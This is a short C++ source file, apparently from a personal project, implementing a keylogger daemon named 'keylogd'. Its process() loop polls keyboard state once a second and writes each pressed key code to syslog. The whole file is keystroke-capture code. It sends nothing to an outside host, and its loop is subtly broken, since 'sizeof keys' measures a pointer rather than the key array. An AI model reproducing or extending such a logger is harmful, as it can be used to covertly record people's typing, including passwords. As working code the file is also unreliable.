//
// Created by dgomez on 28/09/17.
//

#include "keylogger.h"
#include "keyboard/keyboard.h"
#include <syslog.h>
#include <unistd.h>

void Keylogger::process() {

    Keyboard keyboard;

    while (true) {
        uint8_t* keys = keyboard.get_key_status();
        for (int i = 0; i < sizeof keys; i++)
            for (int j = 0; j < 8; j++)
                if (keys[i] & (1 << j))
                    syslog (LOG_NOTICE, "key code %d\n", (i*8) + j);
        sleep(1);
    }
}

const char* Keylogger::get_daemon_name() {
    return "keylogd";
}